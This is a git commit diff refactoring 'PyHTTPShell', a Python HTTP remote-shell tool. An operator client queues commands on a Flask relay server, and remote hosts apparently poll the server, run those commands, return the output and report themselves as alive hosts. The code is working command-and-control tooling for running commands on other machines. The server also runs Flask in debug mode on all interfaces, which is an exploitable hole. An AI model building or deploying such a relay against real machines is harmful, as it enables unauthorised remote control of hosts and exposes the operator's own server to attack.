ee70e96a3121d0209343cd62a65c1d635a63efa6
gatari <79693291+deceptivecz@users.noreply.github.com>
2023-03-07 20:09:47 +0800

    removed global variables and added classes

--- scripts/main.py
+++ scripts/main.py
@@ -2,84 +2,135 @@ import requests
 import time
 import socket
 import os
+import json
 from termcolor import colored
-server_ip = socket.gethostbyname(socket.gethostname())
-path = "~/"
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
 
-def send_command(cmd):
-    global path
-    if "cd" in cmd:
-        if cmd == "cd ~" or cmd == "cd":
-            path = "~/"
-            return
-        if cmd == "cd ..":
-            path = path.strip().split("/")[:-1]
-            path.pop()
-            path = "/".join(path)
-            path += "/"
-            return
+SERVER_IP = socket.gethostbyname(socket.gethostname())
+
+class ShellClient:
+    def __init__(self):
+        self.current_path = "~/"
+        self.user = None
+        self.hostname = None
+        self.prompt = None
+    
+
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def clear_screen():
+        os.system("cls" if os.name == "nt" else "clear")
+    
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def main_menu():
+        print("\n1. Start Shell")
+        print("2. Exit")
+        print("\n")
+
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def banner():
+        print("\n" + "-"*30)
+        print("{:^30}".format("PyHTTPShell"))
+        print("-"*30 + "\n")
+
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def get_alive():
+        alive_hosts = requests.get(f"http://{SERVER_IP}:8080/alive_hosts").text
+        if alive_hosts:
+            alive_hosts = json.loads(alive_hosts)
+            print(f"{colored(f'ALIVE HOSTS ({len(alive_hosts)})', 'green', attrs=['bold'])}")
+            for host in alive_hosts:
+                print(f"- {host}")
         else:
-            path += cmd.split(" ")[1] + "/"
-        return
-    if path:
-        cmd = f"cd {path} && {cmd}"
-    requests.post(f"http://{server_ip}:8080/commands", data=cmd)
+            print(f"{colored('NO HOSTS FOUND', 'red', attrs=['bold'])}\n")
+
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def is_alive():
+        return requests.get(f"http://{SERVER_IP}:8080/alive_hosts").text
+    
+    # SORRY FOR THE STATIC METHODS LOL
+    @staticmethod
+    def fake_attempt():
+        print(colored(f"[*] Attempting Connection...", 'white', attrs=['bold']))
 
 
-def get_result():
-    res = requests.get(f"http://{server_ip}:8080/results").text
-    if res: 
+    def update_prompt(self):
+        self.prompt = f"{colored(f'{self.user}@', 'green')}{colored(self.hostname, 'green')}{colored(f':{self.current_path}$ ', 'white')}"
+    
+    def send_command(self, cmd: str):
+        full_cmd = f"cd {self.current_path} && {cmd}" if self.current_path else cmd
+        requests.post(f"http://{SERVER_IP}:8080/commands", data=full_cmd)
+
+    def handle_cd_command(self, cmd: str):
+        if cmd == "cd ~" or cmd == "cd": # return to home directory
+            self.current_path = None
+        elif cmd == "cd ..":
+            self.current_path = "/".join(self.current_path.split("/")[:-2]) + "/" # remove last directory
+        else:
+            path = cmd.split(" ")[1]
+            self.current_path += f"{path}/"
+
+    def get_result(self):
+        res = requests.get(f"http://{SERVER_IP}:8080/results").text
+        while not res:
+            time.sleep(1)
+            res = requests.get(f"http://{SERVER_IP}:8080/results").text
         return res
-    time.sleep(1)
-    return get_result()
+    
+    def set_hostname(self):
+        self.send_command("hostname")
+        self.hostname = self.get_result().strip()
+    
+    def set_user(self):
+        self.send_command("whoami")
+        self.user = self.get_result().strip()
 
-def menu():
-    print(
-    """
-    1. Start Shell
-    2. Exit
-    """
-)
 
-def beautify_shell():
-    global user, hostname, path
-    print(colored("[*] Beautifying shell...", "white", attrs=["bold"]))
-    send_command("whoami")
-    user = get_result().strip()
-    send_command("hostname")
-    hostname = get_result().strip()
-    clear()
-    print(colored("IMPORTANT: ", "red", attrs=['bold']), "This is not a real shell, and it is relatively unstable. Be careful :)", sep="")
-    print("A list of custom commands is available by using the command ", colored("`$help`", "green", attrs=['bold']), ".\n", sep="")
-    welcome_msg = f"[*] Welcome {colored(f'{user}@', 'green')}{colored(hostname, 'green')}"
-    prompt = f"{colored(f'{user}@', 'green')}{colored(hostname, 'green')}{colored(':$ ', 'white')}"
-    print(welcome_msg)
-    print("[*] Type 'exit' to quit\n")
-    return prompt
+    def welcome_banner(self):
+        print(
+            f"{colored('IMPORTANT: ', 'red', attrs=['bold'])}This is not a real shell, and it is relatively unstable.\
+        A list of custom commands is available by using the command {colored('`$help`', 'white', attrs=['bold'])}.\n\
+            \n[*] Welcome {colored(self.user + '@' + self.hostname, 'green')}\
+            \n[*] Type 'exit' to quit\n"
+        )
 
-def shell():
-    prompt = beautify_shell()
-    while True:
-        if path:
-            prompt = f"{colored(f'{user}@', 'green')}{colored(hostname, 'green')}{colored(f':{path}$ ', 'white')}"
-        cmd = input(prompt)
-        if cmd == "exit":
-            break
-        if "cd" in cmd:
-            send_command(cmd)
-        else:
-            send_command(cmd)
-            result = get_result()
-            print(colored(result, 'cyan'))
-        
-if(__name__ == "__main__"):
-    while True:
-        menu()
-        choice = input(">> ")
-        match choice:
-            case "1":
-                shell()
-            case "2":
+    
+    def beautify_shell(self):
+        self.clear_screen()
+        self.fake_attempt()
+        self.set_hostname()
+        self.set_user()
+        self.welcome_banner()
+
+    def shell(self):
+        self.beautify_shell()
+        while True:
+            self.update_prompt()
+            cmd = input(self.prompt)
+            if cmd == "exit":
                 break
+            if "cd" in cmd:
+                self.handle_cd_command(cmd)
+                continue
+            self.send_command(cmd)
+            result = self.get_result()
+            print(colored(result, 'white'))
+    def run(self):
+        while True:
+            self.banner()
+            self.get_alive()
+            self.main_menu()
+            choice = input(">> ")
+            if choice == "1":
+                self.shell()
+            elif choice == "2":
+                break
+
+
+
+if __name__ == "__main__":
+    client = ShellClient()
+    client.run()
--- scripts/server.py
+++ scripts/server.py
@@ -1,50 +1,67 @@
 from flask import Flask, request
-import socket
+import json
+class Server:
+    def __init__(self):
+        self.app = Flask(__name__)
+        self.command = None
+        self.result = None
+        self.alive_hosts = []
+        
+        @self.app.route("/commands", methods=["GET"])
+        def listen_commands():
+            if self.command:
+                return self.command
+            else:
+                return ""
 
-app = Flask(__name__)
-command = None
-result = None
+        @self.app.route("/commands", methods=["POST"])
+        def send_commands():
+            cmd = request.data.decode("utf-8")
+            try:
+                self.command = cmd
+                return "OK"
+            except Exception as e:
+                return "ERROR: " + str(e)
 
-@app.route("/commands", methods=["GET"])
-def listen_commands():
-    if command:
-        return command
-    else:
-        return ""
+        @self.app.route("/results", methods=["GET"])
+        def listen_results():
+            if self.result:
+                res = self.result
+                self.result = None
+                self.command = None  # Reset command after every GET /result
+                return res
+            else:
+                return ""
 
-@app.route("/commands", methods=["POST"])
-def send_commands():
-    global command
-    cmd = request.data.decode("utf-8")
-    try:
-        command = cmd
-        return "OK"
-    except Exception as e:
-        return "ERROR: " + str(e)
+        @self.app.route("/results", methods=["POST"])
+        def send_results():
+            res = request.data.decode("utf-8")
+            try:
+                self.result = res
+                return ""
+            except Exception as e:
+                return "ERROR: " + str(e)
 
-@app.route("/results", methods=["GET"])
-def listen_results():
-    global result
-    if result:
-        res = result
-        result = None
-        return res
-    else:
-        return ""
-    
-
-@app.route("/results", methods=["POST"])
-def send_results():
-    global result, command
-    res = request.data.decode("utf-8")
-    try:
-        result = res
-        command = None
-        return ""
-    except Exception as e:
-        return "ERROR: " + str(e)
-
+        @self.app.route("/alive_hosts", methods=["GET"])
+        def listen_alive_hosts():
+            if self.alive_hosts:
+                hosts = self.alive_hosts
+                self.alive_hosts = []
+                return json.dumps(hosts)
+            else:
+                return ""
+        
+        @self.app.route("/alive_hosts", methods=["POST"])
+        def send_alive_hosts():
+            ip = request.data.decode("utf-8")
+            if ip not in self.alive_hosts:
+                self.alive_hosts.append(ip)
+            return ""
+    def start(self):
+        ip = "0.0.0.0"
+        port = 8080
+        self.app.run(host=ip, port=port, debug=True)
 
 if __name__ == "__main__":
-    ip = socket.gethostbyname(socket.gethostname())
-    app.run(host=ip, port=8080)
+    server = Server()
+    server.start()
